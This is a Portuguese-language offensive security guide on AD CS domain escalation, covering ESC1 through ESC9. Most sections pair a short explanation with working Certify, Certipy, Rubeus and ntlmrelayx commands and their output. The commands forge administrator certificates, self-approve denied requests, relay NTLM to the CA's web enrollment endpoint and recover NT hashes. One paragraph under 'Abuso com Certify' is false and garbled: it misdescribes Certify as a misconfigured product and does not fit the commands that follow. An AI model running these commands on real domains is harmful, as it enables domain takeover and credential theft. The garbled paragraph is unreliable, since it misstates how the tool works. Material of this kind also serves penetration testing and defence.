# AD CS Escalada de Domínio

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Modelos de Certificado Mal Configurados - ESC1

### Explicação

* O **CA Empresarial** concede **direitos de inscrição a usuários de baixo privilégio**
* **A aprovação do gerente está desativada**
* **Não são necessárias assinaturas autorizadas**
* Um descritor de segurança de **modelo de certificado excessivamente permissivo concede direitos de inscrição de certificado a usuários de baixo privilégio**
* O **modelo de certificado define EKUs que permitem autenticação**:
* _Autenticação do Cliente (OID 1.3.6.1.5.5.7.3.2), Autenticação do Cliente PKINIT (1.3.6.1.5.2.3.4), Logon de Cartão Inteligente (OID 1.3.6.1.4.1.311.20.2.2), Qualquer Finalidade (OID 2.5.29.37.0) ou sem EKU (SubCA)._
* O **modelo de certificado permite que solicitantes especifiquem um subjectAltName no CSR:**
* **AD** irá **usar** a identidade especificada pelo campo **subjectAltName** (SAN) de um certificado **se** estiver **presente**. Consequentemente, se um solicitante puder especificar o SAN em um CSR, o solicitante pode **solicitar um certificado como qualquer pessoa** (por exemplo, um usuário de administrador de domínio). O objeto AD do modelo de certificado **especifica** se o solicitante **pode especificar o SAN** em sua propriedade **`mspki-certificate-name-`**`flag`. A propriedade `mspki-certificate-name-flag` é uma **máscara de bits** e se a flag **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** estiver **presente**, um **solicitante pode especificar o SAN**.

{% hint style="danger" %}
Essas configurações permitem que um **usuário de baixo privilégio solicite um certificado com um SAN arbitrário**, permitindo que o usuário de baixo privilégio se autentique como qualquer principal no domínio via Kerberos ou SChannel.
{% endhint %}

Isso é frequentemente habilitado, por exemplo, para permitir que produtos ou serviços de implantação gerem certificados HTTPS ou certificados de host sob demanda. Ou por falta de conhecimento.

Observe que quando um certificado com essa última opção é criado, um **aviso aparece**, mas não aparece se um **modelo de certificado** com essa configuração é **duplicado** (como o modelo `WebServer` que tem `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` habilitado e então o administrador pode adicionar um OID de autenticação).

### Abuso

Para **encontrar modelos de certificado vulneráveis**, você pode executar:
```bash
Certify.exe find /vulnerable
certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
```
Para **abusar dessa vulnerabilidade e se passar por um administrador**, você pode executar:
```bash
Certify.exe request /ca:dc.theshire.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'
```
Em seguida, você pode transformar o **certificado gerado para o formato `.pfx`** e usá-lo para **autenticação usando Rubeus ou certipy** novamente:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Os binários do Windows "Certreq.exe" e "Certutil.exe" podem ser abusados para gerar o PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Além disso, a seguinte consulta LDAP, quando executada no esquema de configuração da floresta AD, pode ser usada para **enumerar** **modelos de certificado** que não exigem aprovação/assinaturas, que possuem uma EKU de **Autenticação do Cliente ou Logon de Cartão Inteligente** e têm a flag **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** habilitada:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Modelos de Certificado Mal Configurados - ESC2

### Explicação

O segundo cenário de abuso é uma variação do primeiro:

1. O CA da empresa concede direitos de inscrição a usuários com privilégios baixos.
2. A aprovação do gerente está desativada.
3. Não são necessárias assinaturas autorizadas.
4. Um descritor de segurança excessivamente permissivo do modelo de certificado concede direitos de inscrição de certificado a usuários com privilégios baixos.
5. **O modelo de certificado define o EKU de qualquer finalidade ou nenhum EKU.**

O **EKU de qualquer finalidade** permite que um invasor obtenha um **certificado** para **qualquer finalidade**, como autenticação de cliente, autenticação de servidor, assinatura de código, etc. A mesma **técnica usada para ESC3** pode ser usada para abusar disso.

Um **certificado sem EKUs** - um certificado de AC subordinado - também pode ser abusado para **qualquer finalidade**, mas também pode ser usado para **assinar novos certificados**. Dessa forma, usando um certificado de AC subordinado, um invasor pode **especificar EKUs ou campos arbitrários nos novos certificados**.

No entanto, se o **AC subordinado não for confiável** pelo objeto **`NTAuthCertificates`** (o que não será por padrão), o invasor **não poderá criar novos certificados** que funcionem para **autenticação de domínio**. Ainda assim, o invasor pode criar **novos certificados com qualquer EKU** e valores de certificado arbitrários, dos quais há **muitos** que o invasor poderia potencialmente **abusar** (por exemplo, assinatura de código, autenticação de servidor, etc.) e isso pode ter grandes implicações para outras aplicações na rede, como SAML, AD FS ou IPSec.

A seguinte consulta LDAP, quando executada no esquema de configuração da floresta AD, pode ser usada para enumerar modelos que correspondem a esse cenário:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Modelos de Agente de Inscrição Mal Configurados - ESC3

### Explicação

Este cenário é semelhante ao primeiro e ao segundo, mas **abusando** de um **EKU diferente** (Agente de Solicitação de Certificado) e **2 modelos diferentes** (portanto, possui 2 conjuntos de requisitos).

O EKU do **Agente de Solicitação de Certificado** (OID 1.3.6.1.4.1.311.20.2.1), conhecido como **Agente de Inscrição** na documentação da Microsoft, permite que um principal se **inscreva** para um **certificado** em **nome de outro usuário**.

O **"agente de inscrição"** se inscreve em um **modelo** e usa o **certificado resultante para co-assinar uma CSR em nome do outro usuário**. Em seguida, **envia** a **CSR co-assinada** para a CA, se inscrevendo em um **modelo** que **permite "inscrever em nome de"**, e a CA responde com um **certificado pertencente ao "outro" usuário**.

**Requisitos 1:**

1. A CA da Empresa permite que usuários com baixos privilégios tenham direitos de inscrição.
2. A aprovação do gerente está desativada.
3. Não são necessárias assinaturas autorizadas.
4. Um descritor de segurança de modelo de certificado excessivamente permissivo permite que usuários com baixos privilégios tenham direitos de inscrição de certificado.
5. O **modelo de certificado define o EKU do Agente de Solicitação de Certificado**. O OID do Agente de Solicitação de Certificado (1.3.6.1.4.1.311.20.2.1) permite solicitar outros modelos de certificado em nome de outros princípios.

**Requisitos 2:**

1. A CA da Empresa permite que usuários com baixos privilégios tenham direitos de inscrição.
2. A aprovação do gerente está desativada.
3. **A versão do esquema do modelo é 1 ou superior a 2 e especifica um Requisito de Emissão de Política de Aplicativo que exige o EKU do Agente de Solicitação de Certificado**.
4. O modelo de certificado define um EKU que permite autenticação de domínio.
5. Restrições de agente de inscrição não são implementadas na CA.

### Abuso

Você pode usar o [**Certify**](https://github.com/GhostPack/Certify) ou [**Certipy**](https://github.com/ly4k/Certipy) para abusar desse cenário:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req 'corp.local/john:Pass0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
As CAs empresariais podem **restringir** os **usuários** que podem **obter** um **certificado de agente de inscrição**, os modelos de inscrição em que os **agentes de inscrição podem se inscrever** e em quais **contas** o agente de inscrição pode **agir em nome de**, abrindo `certsrc.msc` `snap-in -> clicando com o botão direito no CA -> clicando em Propriedades -> navegando` até a guia "Agentes de Inscrição".

No entanto, a configuração padrão do CA é "Não restringir agentes de inscrição". Mesmo quando os administradores habilitam "Restringir agentes de inscrição", a configuração padrão é extremamente permissiva, permitindo que qualquer pessoa tenha acesso a todos os modelos de inscrição.

## Controle de Acesso Vulnerável ao Modelo de Certificado - ESC4

### **Explicação**

Os **modelos de certificado** possuem um **descritor de segurança** que especifica quais **principais do AD** têm **permissões específicas sobre o modelo**.

Se um **atacante** tiver **permissões suficientes** para **modificar** um **modelo** e **criar** uma das **configurações incorretas** exploráveis das **seções anteriores**, ele poderá explorá-la e **elevar privilégios**.

Direitos interessantes sobre modelos de certificado:

* **Proprietário:** Controle total implícito do objeto, pode editar todas as propriedades.
* **ControleTotal:** Controle total do objeto, pode editar todas as propriedades.
* **EscreverProprietário:** Pode modificar o proprietário para um principal controlado pelo atacante.
* **EscreverDacl**: Pode modificar o controle de acesso para conceder ControleTotal a um atacante.
* **EscreverPropriedade:** Pode editar todas as propriedades.

### Abuso

Um exemplo de elevação de privilégios como o anterior:

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

O ESC4 ocorre quando um usuário possui privilégios de escrita sobre um modelo de certificado. Isso pode ser abusado, por exemplo, para sobrescrever a configuração do modelo de certificado e torná-lo vulnerável ao ESC1.

Como podemos ver no caminho acima, apenas `JOHNPC` possui esses privilégios, mas nosso usuário `JOHN` possui a nova relação `AddKeyCredentialLink` com `JOHNPC`. Como essa técnica está relacionada a certificados, também implementei esse ataque, conhecido como [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Aqui está uma pequena prévia do comando `shadow auto` do Certipy para recuperar o hash NT da vítima.

<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

O Certipy pode sobrescrever a configuração de um modelo de certificado com um único comando. Por **padrão**, o Certipy irá **sobrescrever** a configuração para torná-la **vulnerável ao ESC1**. Também podemos especificar o parâmetro **`-save-old` para salvar a configuração antiga**, o que será útil para **restaurar** a configuração após nosso ataque.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Controle de Acesso a Objetos PKI Vulneráveis - ESC5

### Explicação

A teia de relacionamentos baseados em ACL interconectados que podem afetar a segurança do AD CS é extensa. Vários **objetos fora dos modelos de certificado** e da própria autoridade de certificação podem ter um **impacto na segurança de todo o sistema AD CS**. Essas possibilidades incluem (mas não se limitam a):

* O **objeto de computador AD do servidor CA** (ou seja, comprometimento por meio de S4U2Self ou S4U2Proxy)
* O **servidor RPC/DCOM do servidor CA**
* Qualquer **objeto ou contêiner AD descendente no contêiner** `CN=Serviços de Chave Pública,CN=Serviços,CN=Configuração,DC=<DOMÍNIO>,DC=<COM>` (por exemplo, o contêiner Modelos de Certificado, contêiner Autoridades de Certificação, o objeto NTAuthCertificates, o Contêiner de Serviços de Inscrição, etc.)

Se um atacante com privilégios baixos puder obter **controle sobre qualquer um desses**, o ataque provavelmente poderá **comprometer o sistema PKI**.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explicação

Existe outro problema semelhante, descrito no [**post da CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage), que envolve a flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`**. Conforme descrito pela Microsoft, "se essa flag estiver **ativada** no CA, **qualquer solicitação** (incluindo quando o assunto é construído a partir do Active Directory®) pode ter **valores definidos pelo usuário** no **nome alternativo do assunto**".\
Isso significa que um **atacante** pode se inscrever em **QUALQUER modelo** configurado para **autenticação de domínio** que também **permite que usuários não privilegiados** se inscrevam (por exemplo, o modelo de Usuário padrão) e **obter um certificado** que nos permite **autenticar** como um administrador de domínio (ou **qualquer outro usuário/máquina ativa**).

**Observação**: os **nomes alternativos** aqui são **incluídos** em uma CSR por meio do argumento `-attrib "SAN:"` para `certreq.exe` (ou seja, "Pares de Nome Valor"). Isso é **diferente** do método para **abusar de SANs** em ESC1, pois **armazena informações da conta em um atributo do certificado em vez de uma extensão do certificado**.

### Abuso

As organizações podem **verificar se a configuração está ativada** usando o seguinte comando `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Abaixo, isso usa apenas o **registro remoto**, então o seguinte comando também pode funcionar:
```
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) e [**Certipy**](https://github.com/ly4k/Certipy) também verificam isso e podem ser usados para abusar dessa configuração incorreta:
```bash
# Check for vulns, including this one
Certify.exe find

# Abuse vuln
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Essas configurações podem ser **definidas**, assumindo direitos **administrativos de domínio** (ou equivalentes), a partir de qualquer sistema:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Se você encontrar essa configuração em seu ambiente, você pode **remover essa flag** com:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Após as atualizações de segurança de maio de 2022, os novos **certificados** terão uma **extensão de segurança** que **incorpora** a propriedade **`objectSid` do solicitante**. Para ESC1, essa propriedade será refletida a partir do SAN especificado, mas com **ESC6**, essa propriedade reflete o **`objectSid` do solicitante**, e não do SAN.\
Portanto, **para abusar do ESC6**, o ambiente deve ser **vulnerável ao ESC10** (Mapeamentos de Certificado Fracos), onde o **SAN é preferido em relação à nova extensão de segurança**.
{% endhint %}

## Controle de Acesso Vulnerável à Autoridade de Certificação - ESC7

### Ataque 1

#### Explicação

Uma autoridade de certificação em si possui um **conjunto de permissões** que protegem várias **ações da AC**. Essas permissões podem ser acessadas através do `certsrv.msc`, clicando com o botão direito em uma AC, selecionando Propriedades e mudando para a guia Segurança:

<figure><img src="../../../.gitbook/assets/image (73) (2).png" alt=""><figcaption></figcaption></figure>

Isso também pode ser enumerado através do [**módulo PSPKI**](https://www.pkisolutions.com/tools/pspki/) com `Get-CertificationAuthority | Get-CertificationAuthorityAcl`:
```bash
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-certificationAuthorityAcl | select -expand Access
```
Os dois principais direitos aqui são o direito **`ManageCA`** e o direito **`ManageCertificates`**, que se traduzem em "administrador de CA" e "Gerenciador de Certificados".

#### Abuso

Se você tiver um principal com direitos **`ManageCA`** em uma **autoridade de certificação**, podemos usar o **PSPKI** para alterar remotamente o bit **`EDITF_ATTRIBUTESUBJECTALTNAME2`** para **permitir a especificação de SAN** em qualquer modelo ([ECS6](domain-escalation.md#editf\_attributesubjectaltname2-esc6)):

<figure><img src="../../../.gitbook/assets/image (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (70) (2).png" alt=""><figcaption></figcaption></figure>

Isso também é possível de forma mais simples com o cmdlet [**Enable-PolicyModuleFlag**](https://www.sysadmins.lv/projects/pspki/enable-policymoduleflag.aspx) do **PSPKI**.

O direito **`ManageCertificates`** permite **aprovar uma solicitação pendente**, portanto, ignorando a proteção de "aprovação do gerenciador de certificados da CA".

Você pode usar uma **combinação** dos módulos **Certify** e **PSPKI** para solicitar um certificado, aprová-lo e baixá-lo:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.theshire.local\theshire-DC-CA /id:336
```
### Ataque 2

#### Explicação

{% hint style="warning" %}
No **ataque anterior**, as permissões **`Gerenciar CA`** foram usadas para **habilitar** a flag **EDITF\_ATTRIBUTESUBJECTALTNAME2** e realizar o ataque **ESC6**, mas isso não terá efeito até que o serviço CA (`CertSvc`) seja reiniciado. Quando um usuário tem o direito de acesso `Gerenciar CA`, o usuário também tem permissão para **reiniciar o serviço**. No entanto, isso **não significa que o usuário possa reiniciar o serviço remotamente**. Além disso, o **ESC6 pode não funcionar** em ambientes atualizados devido às atualizações de segurança de maio de 2022.
{% endhint %}

Portanto, outro ataque é apresentado aqui.

Pré-requisitos:

* Apenas a permissão **`Gerenciar CA`**
* Permissão **`Gerenciar Certificados`** (pode ser concedida a partir de **`Gerenciar CA`**)
* O modelo de certificado **`SubCA`** deve estar **habilitado** (pode ser habilitado a partir de **`Gerenciar CA`**)

A técnica se baseia no fato de que usuários com o direito de acesso `Gerenciar CA` _e_ `Gerenciar Certificados` podem **emitir solicitações de certificado falhadas**. O modelo de certificado **`SubCA`** é **vulnerável ao ESC1**, mas **apenas administradores** podem se inscrever no modelo. Assim, um **usuário** pode **solicitar** a inscrição no **`SubCA`** - que será **negada** - mas **depois emitida pelo gerente**.

#### Abuso

Você pode **conceder a si mesmo a permissão `Gerenciar Certificados`** adicionando seu usuário como um novo oficial.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
O modelo **`SubCA`** pode ser **ativado no CA** com o parâmetro `-enable-template`. Por padrão, o modelo `SubCA` está ativado.
```bash
# List templates
certipy ca 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Se já cumprimos os pré-requisitos para esse ataque, podemos começar **solicitando um certificado com base no modelo `SubCA`**.

**Essa solicitação será negada**, mas iremos salvar a chave privada e anotar o ID da solicitação.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Com nosso **`Gerenciar CA` e `Gerenciar Certificados`**, podemos então **emitir a solicitação de certificado falha** com o comando `ca` e o parâmetro `-issue-request <ID da solicitação>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
E finalmente, podemos **recuperar o certificado emitido** com o comando `req` e o parâmetro `-retrieve <ID da solicitação>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay para Pontos Finais HTTP do AD CS - ESC8

### Explicação

{% hint style="info" %}
Em resumo, se um ambiente tiver o **AD CS instalado**, juntamente com um **ponto final de inscrição web vulnerável** e pelo menos um **modelo de certificado publicado** que permita a **inscrição de computadores de domínio e autenticação de clientes** (como o modelo padrão **`Machine`**), então um **atacante pode comprometer QUALQUER computador com o serviço spooler em execução**!
{% endhint %}

O AD CS suporta vários **métodos de inscrição baseados em HTTP** por meio de funções adicionais do servidor AD CS que os administradores podem instalar. Essas interfaces de inscrição de certificado baseadas em HTTP são todas **ataques de relay NTLM vulneráveis**. Usando o relay NTLM, um atacante em uma **máquina comprometida pode se passar por qualquer conta AD que autentica com NTLM**. Ao se passar pela conta da vítima, um atacante pode acessar essas interfaces web e **solicitar um certificado de autenticação do cliente com base nos modelos de certificado `User` ou `Machine`**.

* A **interface de inscrição web** (uma aplicação ASP com aparência antiga acessível em `http://<caserver>/certsrv/`), por padrão, suporta apenas HTTP, que não pode proteger contra ataques de relay NTLM. Além disso, ela permite explicitamente apenas autenticação NTLM por meio do cabeçalho HTTP de Autorização, portanto, protocolos mais seguros como Kerberos não podem ser usados.
* O **Serviço de Inscrição de Certificado** (CES), o **Serviço Web de Política de Inscrição de Certificado** (CEP) e o **Serviço de Inscrição de Dispositivo de Rede** (NDES) suportam autenticação de negociação por padrão por meio do cabeçalho HTTP de Autorização. A autenticação de negociação **suporta** Kerberos e **NTLM**; consequentemente, um atacante pode **negociar para autenticação NTLM** durante ataques de relay. Esses serviços web pelo menos habilitam HTTPS por padrão, mas infelizmente o HTTPS por si só **não protege contra ataques de relay NTLM**. Somente quando o HTTPS é combinado com o vínculo de canal, os serviços HTTPS podem ser protegidos contra ataques de relay NTLM. Infelizmente, o AD CS não habilita a Proteção Estendida para Autenticação no IIS, que é necessária para habilitar o vínculo de canal.

Problemas comuns dos ataques de relay NTLM são que as **sessões NTLM geralmente são curtas** e que o atacante **não pode** interagir com serviços que **exigem assinatura NTLM**.

No entanto, abusar de um ataque de relay NTLM para obter um certificado do usuário resolve essas limitações, pois a sessão durará enquanto o certificado for válido e o certificado pode ser usado para usar serviços que **exigem assinatura NTLM**. Para saber como usar um certificado roubado, consulte:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Outra limitação dos ataques de relay NTLM é que eles **exigem que uma conta de vítima se autentique em uma máquina controlada pelo atacante**. Um atacante pode esperar ou tentar **forçar** isso:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Abuso**

O comando `cas` do **Certify** pode enumerar **pontos finais HTTP habilitados do AD CS**:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

As Autoridades de Certificação Empresariais também **armazenam os pontos de extremidade CES** em seu objeto AD na propriedade `msPKI-Enrollment-Servers`. O **Certutil.exe** e o **PSPKI** podem analisar e listar esses pontos de extremidade:
```
certutil.exe -enrollmentServerURL -config CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA
```
<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (8) (2) (2).png" alt=""><figcaption></figcaption></figure>

#### Abuso com Certify

O Certify é uma ferramenta de gerenciamento de certificados que pode ser abusada para obter privilégios de domínio em um ambiente do Active Directory. Essa técnica de escalonamento de privilégios é possível devido a uma configuração incorreta do Certify, que permite que usuários não privilegiados solicitem e obtenham certificados de domínio.

Para explorar essa vulnerabilidade, um invasor pode criar uma solicitação de certificado malicioso e enviá-la para o Certify. Se a configuração do Certify permitir que usuários não privilegiados solicitem certificados de domínio, o invasor poderá obter um certificado com privilégios de domínio.

Com o certificado de domínio em mãos, o invasor pode usá-lo para autenticar-se como um controlador de domínio legítimo e obter acesso a recursos sensíveis, como controladores de domínio adicionais, servidores de arquivos e bancos de dados.

Para mitigar esse tipo de abuso, é importante garantir que apenas usuários privilegiados possam solicitar certificados de domínio no Certify. Além disso, é recomendável monitorar e auditar as solicitações de certificados para detectar atividades suspeitas.
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuso com Certipy

Por padrão, o Certipy solicitará um certificado com base no modelo `Machine` ou `User`, dependendo se o nome da conta transmitida termina com `$`. É possível especificar outro modelo com o parâmetro `-template`.

Podemos então usar uma técnica como o PetitPotam para forçar a autenticação. Para controladores de domínio, devemos especificar `-template DomainController`.
```
$ certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Extensão de Segurança Desativada - ESC9 <a href="#5485" id="5485"></a>

### Explicação

ESC9 refere-se ao novo valor **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) do **`msPKI-Enrollment-Flag`**. Se essa flag estiver definida em um modelo de certificado, a nova extensão de segurança **`szOID_NTDS_CA_SECURITY_EXT`** não será incorporada. ESC9 só é útil quando `StrongCertificateBindingEnforcement` está definido como `1` (padrão), pois uma configuração de mapeamento de certificado mais fraca para Kerberos ou Schannel pode ser abusada como ESC10 - sem ESC9 - pois os requisitos serão os mesmos.

* `StrongCertificateBindingEnforcement` não definido como `2` (padrão: `1`) ou `CertificateMappingMethods` contém a flag `UPN`
* Certificado contém a flag `CT_FLAG_NO_SECURITY_EXTENSION` no valor `msPKI-Enrollment-Flag`
* Certificado especifica qualquer EKU de autenticação do cliente
* `GenericWrite` em qualquer conta A para comprometer qualquer conta B

### Abuso

Neste caso, `John@corp.local` tem `GenericWrite` sobre `Jane@corp.local` e queremos comprometer `Administrator@corp.local`. `Jane@corp.local` tem permissão para se inscrever no modelo de certificado `ESC9`, que especifica a flag `CT_FLAG_NO_SECURITY_EXTENSION` no valor `msPKI-Enrollment-Flag`.

Primeiro, obtemos o hash de `Jane` usando, por exemplo, Shadow Credentials (usando nosso `GenericWrite`).

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (22).png" alt=""><figcaption></figcaption></figure>

Em seguida, alteramos o `userPrincipalName` de `Jane` para ser `Administrator`. Observe que estamos deixando de fora a parte `@corp.local`.

<figure><img src="../../../.gitbook/assets/image (2) (2) (3).png" alt=""><figcaption></figcaption></figure>

Isso não viola as restrições, pois o `userPrincipalName` do usuário `Administrator` é `Administrator@corp.local` e não `Administrator`.

Agora, solicitamos o modelo de certificado vulnerável `ESC9`. Devemos solicitar o certificado como `Jane`.

<figure><img src="../../../.gitbook/assets/image (16) (2).png" alt=""><figcaption></figcaption></figure>

Observe que o `userPrincipalName` no certificado é `Administrator` e que o certificado emitido não contém um "object SID".

Em seguida, alteramos novamente o `userPrincipalName` de `Jane` para ser algo diferente, como seu `userPrincipalName` original `Jane@corp.local`.

<figure><img src="../../../.gitbook/assets/image (24) (2).png" alt=""><figcaption></figcaption></figure>

Agora, se tentarmos autenticar com o certificado, receberemos o hash NT do usuário `Administrator@corp.local`. Você precisará adicionar `-domain <domínio>` à linha de comando, pois nenhum domínio é especificado no certificado.

